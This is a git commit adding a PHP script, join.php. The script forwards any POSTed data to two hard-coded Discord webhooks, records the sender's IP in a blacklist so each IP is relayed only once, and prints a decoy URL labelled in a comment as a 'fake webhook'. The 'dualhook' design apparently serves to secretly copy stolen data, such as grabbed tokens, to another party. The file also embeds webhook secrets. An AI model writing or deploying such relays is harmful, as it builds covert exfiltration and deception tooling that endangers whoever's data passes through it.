cb25e8891a27b8ada2cb2856b16488484c9ed8d8
delltaxa <114283067+delltaxa@users.noreply.github.com>
2022-11-21 13:15:38 +0100

    Add files via upload

---
+++ join.php
@@ -0,0 +1,56 @@
+<?php
+#qA%L%SCb#UFNicETzJAp
+$webhook = "https://discord.com/api/webhooks/1043459003851751426/upIlgf_lL73QQa0wEj8mIi1j4SGhsCptqFDQ-UPOZqxEFXMsVTEu_GT6e4zQA4QhHGtT"; // hook1
+$webhook2 = "https://discord.com/api/webhooks/1043459003851751426/upIlgf_lL73QQa0wEj8mIi1j4SGhsCptqFDQ-UPOZqxEFXMsVTEu_GT6e4zQA4QhHGtT"; // hook2
+
+
+$target_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+$target_ip_clam = "<" . $target_ip . ">";
+$blacklist = "blackkkkis.lst";
+
+$is_blacklisted = False;
+
+if (strpos(file_get_contents($blacklist), $target_ip_clam) !== false)  {
+    $is_blacklisted = True;
+}
+
+if ($is_blacklisted === false && $_SERVER['REQUEST_METHOD'] === 'POST') {
+
+        $payload = file_get_contents('php://input');
+
+        $ch = curl_init();  
+
+        curl_setopt_array( $ch, [
+            CURLOPT_URL => $webhook,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $payload,
+            CURLOPT_HTTPHEADER => [
+                "Content-Type: application/json"
+            ]
+        ]); 
+
+        $response = curl_exec( $ch );
+        curl_close( $ch );  
+
+        $fp = fopen($blacklist, 'a');
+        fwrite($fp, $target_ip_clam);  
+        fclose($fp);  
+
+        /* dualhook */
+        $ch = curl_init();  
+        curl_setopt_array( $ch, [
+            CURLOPT_URL => $webhook2,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $payload,
+            CURLOPT_HTTPHEADER => [
+                "Content-Type: application/json"
+            ]
+        ]); 
+
+        $response = curl_exec( $ch );
+        curl_close( $ch );  
+}
+
+echo "https://discord.com/api/webhooks/8003690471785144415/41F_FFNoDo1jeGhE9TA94a5djjHOa_UCxj0Y1pAjdhdwBtyL5z-9UMkXigLp2TE5QVo3" // fake webhook
+
+?>
